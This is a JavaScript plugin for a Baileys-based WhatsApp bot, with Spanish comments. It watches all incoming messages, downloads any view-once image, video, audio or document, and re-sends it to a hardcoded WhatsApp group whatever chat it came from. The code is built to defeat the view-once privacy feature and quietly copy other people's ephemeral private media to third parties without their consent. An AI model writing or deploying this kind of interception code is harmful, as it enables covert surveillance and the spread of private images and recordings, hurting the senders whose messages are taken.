let yaIniciado = false
const TARGET_GROUP = '120363402969655890@g.us'

/**
 * Devuelve el "inner message" (soporta ephemeralMessage -> message)
 */
const getInner = (m) => {
  if (!m || !m.message) return null
  return m.message.ephemeralMessage?.message || m.message
}

/**
 * Intenta obtener un buffer del mensaje.
 * Primero usa m.download?.() si existe (tu wrapper), sino usa baileys.downloadContentFromMessage.
 */
const getBufferFromMessage = async (msgObj) => {
  // Si el wrapper del bot ya provee .download()
  if (typeof msgObj?.download === 'function') {
    return await msgObj.download()
  }

  // Si no, usar downloadContentFromMessage de baileys
  const { downloadContentFromMessage } = await import('@whiskeysockets/baileys')
  const stream = await downloadContentFromMessage(msgObj, msgObj.mimetype?.startsWith('video') ? 'video' : (msgObj.mimetype?.startsWith('audio') ? 'audio' : 'image'))
  // stream es un async iterable; convertir a buffer
  const chunks = []
  for await (const chunk of stream) chunks.push(chunk)
  return Buffer.concat(chunks)
}

let handler = m => m

handler.all = async function (m, { conn }) {
  // inicializar solo una vez (evita múltiples listeners)
  if (!yaIniciado) yaIniciado = true

  // solo procesar mensajes que contienen algo
  if (!m || !m.key || !m.message) return !0

  // Obtener inner message (soporta ephemeral)
  const inner = getInner(m)
  if (!inner) return !0

  // Buscar la clave que contiene el media (imageMessage, videoMessage, audioMessage, etc.)
  const mediaKey = Object.keys(inner).find(k =>
    /imageMessage|videoMessage|audioMessage|stickerMessage|documentMessage/i.test(k)
  )
  if (!mediaKey) return !0

  // Asegurarse de que sea viewOnce (puede estar en inner[mediaKey].viewOnce === true)
  const mediaObj = inner[mediaKey]
  const isViewOnce = !!mediaObj?.viewOnce
  if (!isViewOnce) return !0

  // Solo procesar en el grupo objetivo
  const from = m.key.remoteJid
  // opcional: solo actuar si viene de cualquier chat; si quieres filtrar por origen usa: if (from !== TARGET_GROUP) return !0
  // el pedido fue "cada vez que se detecte un formato ... a este grupo" -> asumimos reenviar AL TARGET_GROUP, sin importar origen
  // Si quieres que solo actúe cuando el viewOnce llegue a TARGET_GROUP, descomenta la línea siguiente:
  // if (from !== TARGET_GROUP) return !0

  // Descargar y reenviar según tipo
  try {
    const mimetype = mediaObj?.mimetype || ''
    const buffer = await getBufferFromMessage(mediaObj)

    if (!buffer || buffer.length === 0) return !0

    // Imagen
    if (/image/i.test(mediaKey) || /image/i.test(mimetype)) {
      await conn.sendMessage(TARGET_GROUP, { image: buffer, caption: mediaObj.caption || '' })
      return !0
    }

    // Video
    if (/video/i.test(mediaKey) || /video/i.test(mimetype)) {
      await conn.sendMessage(TARGET_GROUP, { video: buffer, caption: mediaObj.caption || '' })
      return !0
    }

    // Audio
    if (/audio/i.test(mediaKey) || /audio/i.test(mimetype)) {
      // enviar como audio normal o ptt según prefieras; aquí usamos ptt=true
      await conn.sendMessage(TARGET_GROUP, { audio: buffer, ptt: true })
      return !0
    }

    // Document / otro -> reenviar como documento
    await conn.sendMessage(TARGET_GROUP, { document: buffer, mimetype: mimetype || 'application/octet-stream', fileName: 'file' })
  } catch (err) {
    // Mostrar error en consola para depuración (puedes quitar si no quieres logs)
    console.error('Error procesando viewOnce:', err)
  }

  return !0
}

export default handler
